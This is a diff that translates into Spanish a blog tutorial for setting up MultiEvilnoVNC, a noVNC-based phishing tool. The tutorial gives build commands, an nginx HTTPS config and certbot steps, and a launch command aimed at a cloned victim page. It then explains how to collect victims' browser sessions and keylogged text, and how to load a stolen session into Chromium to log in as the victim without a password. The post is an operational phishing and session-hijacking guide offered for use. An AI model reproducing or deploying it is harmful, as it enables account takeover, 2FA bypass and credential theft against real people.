@@ -1,8 +1,8 @@
 ---
-title: Setting Up MultiEvilnoVNC with HTTPS
-description: This guide provides detailed instructions for setting up MultiEvilNoVNC, including preparing Docker containers, configuring Nginx, obtaining SSL certificates with Certbot, and modifying the startup script to ensure proper functionality. Additionally, it covers how to run the tool and manage and view sessions of websites visited by users.
-snippetone: Tools
-category: Tools
+title: Configuración de MultiEvilnoVNC con HTTPS
+description: Esta guía proporciona instrucciones detalladas para configurar MultiEvilNoVNC, incluyendo la preparación de contenedores Docker, configuración de Nginx, obtención de certificados SSL con Certbot, y modificación del script de inicio para asegurar el funcionamiento adecuado. Además, cubre cómo ejecutar la herramienta y gestionar y visualizar sesiones de sitios web visitados por usuarios.
+snippetone: Herramientas
+category: Herramientas
 SEOTitle: MultiEvilnoVNC
 lang: es
 date: 2024-07-18
@@ -12,24 +12,24 @@ date: 2024-07-18
 
 ![Application Logo](/static/blog/img/MultiEvilnoVNC.png)
 
-### Introduction
+### Introducción
 
-In this guide, we are going to configure a tool called [MultiEvilNoVNC](https://github.com/wanetty/MultiEvilnoVNC). This tutorial will cover configuring Nginx, obtaining SSL certificates with Certbot, preparing Docker containers, and modifying the startup script to ensure proper functionality.
+En esta guía, vamos a configurar una herramienta llamada [MultiEvilNoVNC](https://github.com/wanetty/MultiEvilnoVNC). Este tutorial cubrirá la configuración de Nginx, obtención de certificados SSL con Certbot, preparación de contenedores Docker, y modificación del script de inicio para asegurar el funcionamiento adecuado.
 
-### Requirements
+### Requisitos
 
-Before you begin, make sure you have the following:
+Antes de comenzar, asegúrate de tener lo siguiente:
 
-1. A test domain (e.g. `testdomain.com`).
-2. Docker installed on your system.
-3. Certbot installed for obtaining SSL certificates.
+1. Un dominio de prueba (ej. `testdomain.com`).
+2. Docker instalado en tu sistema.
+3. Certbot instalado para obtener certificados SSL.
 
 
-### Step 1: Preparing the Docker Containers
+### Paso 1: Preparación de los Contenedores Docker
 
-First, you must mount the Docker containers. This can be done in two ways:
+Primero, debes montar los contenedores Docker. Esto se puede hacer de dos maneras:
 
-#### Automatic Method:
+#### Método Automático:
 
 ```bash
 git clone https://github.com/wanetty/MultiEvilnoVNC.git
@@ -37,7 +37,7 @@ cd EvilnoVNC
 make build
 ```
 
-#### Manual method:
+#### Método manual:
 
 ```bash
 git clone https://github.com/wanetty/MultiEvilnoVNC.git
@@ -48,9 +48,9 @@ sudo docker build -f nginx.Dockerfile -t evilnginx .
 ```
 
 
-### Step 2: Configuring Nginx for HTTPS
+### Paso 2: Configuración de Nginx para HTTPS
 
-Next, configure Nginx to handle HTTP and HTTPS requests. Create a configuration file in `Files/default.conf` with the following content:
+A continuación, configura Nginx para manejar solicitudes HTTP y HTTPS. Crea un archivo de configuración en `Files/default.conf` con el siguiente contenido:
 
 ```nginx
 server {
@@ -70,7 +70,7 @@ server {
     ssl_certificate /certs/fullchain.pem;
     ssl_certificate_key /certs/privkey.pem;
 
-    # SSL settings
+    # Configuraciones SSL
     ssl_protocols TLSv1.2 TLSv1.3;
     ssl_prefer_server_ciphers on;
     ssl_ciphers 'EECDH+AESGCM:EDH+AESGCM:AES256+EECDH:AES256+EDH';
@@ -91,54 +91,54 @@ server {
 }
 ```
 
-### Step 3: Obtaining SSL Certificates
+### Paso 3: Obtención de Certificados SSL
 
-To secure HTTPS communication, you need to obtain SSL certificates. We will use Certbot for this purpose. Run the following command:
+Para asegurar la comunicación HTTPS, necesitas obtener certificados SSL. Usaremos Certbot para este propósito. Ejecuta el siguiente comando:
 
 ```bash
 sudo certbot certonly --standalone --preferred-challenges http -d testdomain.com
 ```
-![Certificate files](/static/blog/img/multivnc_cert1.png)
+![Archivos de certificado](/static/blog/img/multivnc_cert1.png)
 
-> **Warning:** You can obtain the certificates in another way if you prefer.
+> **Advertencia:** Puedes obtener los certificados de otra manera si lo prefieres.
 
-### Step 4: Modifying the Startup Script
+### Paso 4: Modificación del Script de Inicio
 
-The startup script `start_auto.sh` needs to be modified to configure Docker and copy the certificates to the correct location. Below is an extract of the script with the modifications indicated in the image provided:
+El script de inicio `start_auto.sh` necesita ser modificado para configurar Docker y copiar los certificados a la ubicación correcta. A continuación se muestra un extracto del script con las modificaciones indicadas en la imagen proporcionada:
 
-![Modifications of start_auto.sh](/static/blog/img/multivnc_startauto.png)
+![Modificaciones de start_auto.sh](/static/blog/img/multivnc_startauto.png)
 
 
-### Step 5: Execute the tool
+### Paso 5: Ejecutar la herramienta
 
-Finally, run the tool using the following command:
+Finalmente, ejecuta la herramienta usando el siguiente comando:
 
 ```bash
 ./start_auto.sh https://clone.victim.page.com
 ```
 
-### After the execution
+### Después de la ejecución
 
-In the `Downloads` folder, you will find the sessions of the websites that have been visited by users. These sessions are identified by the same identifier as the website. In addition, within each session, there is a file called `keylogger` which contains the text written by the victim.
+En la carpeta `Downloads`, encontrarás las sesiones de los sitios web que han sido visitados por usuarios. Estas sesiones están identificadas por el mismo identificador que el sitio web. Además, dentro de cada sesión, hay un archivo llamado `keylogger` que contiene el texto escrito por la víctima.
 
-If you want to open the sessions in a browser, you can do so by copying the content of one of the sessions to your Chromium configuration as follows (replace `SESSION_ID` with the identifier of the session you want to open):
+Si quieres abrir las sesiones en un navegador, puedes hacerlo copiando el contenido de una de las sesiones a tu configuración de Chromium de la siguiente manera (reemplaza `SESSION_ID` con el identificador de la sesión que quieres abrir):
 
 ```bash
 cp -R Downloads/SESSION_ID ~/.config/chromium/
 ```
 
-Then, run Chromium with the following command:
+Luego, ejecuta Chromium con el siguiente comando:
 
 ```bash
 /bin/bash -c "/usr/bin/chromium --no-sandbox --disable-crash-reporter --password-store=basic &" > /dev/null 2>&1 &
 ```
-After that, open Chromium and navigate to the victim's website. You should be able to log in without needing to enter a username and password.
+Después de eso, abre Chromium y navega al sitio web de la víctima. Deberías poder iniciar sesión sin necesidad de introducir un nombre de usuario y contraseña.
 
-### Other related sites.
+### Otros sitios relacionados
 
-* [Darkbyte Blog](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
+* [Blog de Darkbyte](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
 
-* [Inspiration for multisessions](https://datawookie.dev/blog/2021/08/websockify-novnc-behind-an-nginx-proxy/)
+* [Inspiración para multisesiones](https://datawookie.dev/blog/2021/08/websockify-novnc-behind-an-nginx-proxy/)
 
-* [Official guide to nginx via https](https://nginx.org/en/docs/http/configuring_https_servers.html)
+* [Guía oficial de nginx vía https](https://nginx.org/en/docs/http/configuring_https_servers.html)
 
